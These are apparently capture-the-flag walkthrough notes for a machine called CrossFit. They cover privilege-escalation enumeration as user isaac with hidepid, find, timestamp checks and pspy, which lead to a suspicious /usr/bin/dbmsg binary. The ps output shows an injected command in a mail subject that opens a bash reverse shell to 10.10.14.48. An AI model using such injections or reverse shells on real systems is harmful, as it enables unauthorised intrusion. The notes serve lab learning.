# Shell as Issac
## PID of other user hidden 
```bash
isaac@crossfit:~$ grep proc /etc/fstab
proc /proc proc rw,nosuid,nodev,noexec,relatime,hidepid=2 0 0

isaac@crossfit:~$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
isaac     1520  1516  0 01:18 ?        00:00:00 /bin/sh -c /usr/bin/php /home/isaac/send_updates/send_updates.php
isaac     1521  1520  0 01:18 ?        00:00:03 /usr/bin/php /home/isaac/send_updates/send_updates.php
isaac     1522  1521  0 01:18 ?        00:00:00 sh -c /usr/bin/mail -s 'CrossFit Club Newsletter' ; bash -c 'bash -i  >& /dev/tcp/10.10.14.48/9001 0>&1'; '1'
isaac     1524  1522  0 01:18 ?        00:00:00 bash -c bash -i  >& /dev/tcp/10.10.14.48/9001 0>&1
isaac     1525  1524  0 01:18 ?        00:00:00 bash -i
isaac     1654     1  0 01:28 ?        00:00:00 /lib/systemd/systemd --user
isaac     1684  1683  0 01:28 pts/1    00:00:00 -bash
isaac     1748  1684  0 01:34 pts/1    00:00:00 ps -ef
isaac@crossfit:~$
```

# Find
Modified files around
```bash
find / -newermt "2020-05-04" ! -newermt "2020-05-14" -ls 2>/dev/null | grep -v 'python\|run'
  692      0 lrwxrwxrwx   1 root     root           27 May 11  2020 /vmlinuz.old -> boot/vmlinuz-4.19.0-6-amd64
   262152     40 drwxr-xr-x   2 root     root        36864 May 13  2020 /usr/bin
   296729      0 lrwxrwxrwx   1 root     root           26 May  4  2020 /usr/bin/movemail -> /etc/alternatives/movemail
   296733      0 lrwxrwxrwx   1 root     root           25 May  4  2020 /usr/bin/readmsg -> /etc/alternatives/readmsg
   296721      0 lrwxrwxrwx   1 root     root           21 May  4  2020 /usr/bin/frm -> /etc/alternatives/frm
   296737      0 lrwxrwxrwx   1 root     root           25 May  4  2020 /usr/bin/dotlock -> /etc/alternatives/dotlock
   296741      0 lrwxrwxrwx   1 root     root           23 May  4  2020 /usr/bin/mailx -> /etc/alternatives/mailx
   297014      4 -rwxr-xr-x   1 root     root          113 May  5  2020 /usr/bin/firefox
   270568      0 lrwxrwxrwx   1 root     root           26 May  4  2020 /usr/bin/messages -> /etc/alternatives/messages
   297071      0 lrwxrwxrwx   1 root     root           30 May  5  2020 /usr/bin/firefox-esr -> ../lib/firefox-esr/firefox-esr
     3275     20 -rwxr-xr-x   1 root     root        19008 May 13  2020 /usr/bin/dbmsg
...[snip]...	 
```

Nanoseconds on timestamp in /usr/bin
```bash
isaac@crossfit:/usr/bin$ ls -lt --time-style=full-iso  | grep -v '000000000\| ->'
total 230608
-rwxr-xr-x 1 root root       19008 2020-05-13 03:10:48.588000000 -0400 dbmsg
isaac@crossfit:/usr/bin$ ls -la | wc -l
1000
```

PSpy with filesystem events (-f)
```bash
isaac@crossfit:/dev/shm$ ./pspy64s -f

...[snip]...


pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/04/02 02:37:49 CMD: UID=1000 PID=2546   | ./pspy64s -f

...[snip]...

2021/04/02 02:38:01 FS:        CLOSE_NOWRITE | /usr/bin/dbmsg
```

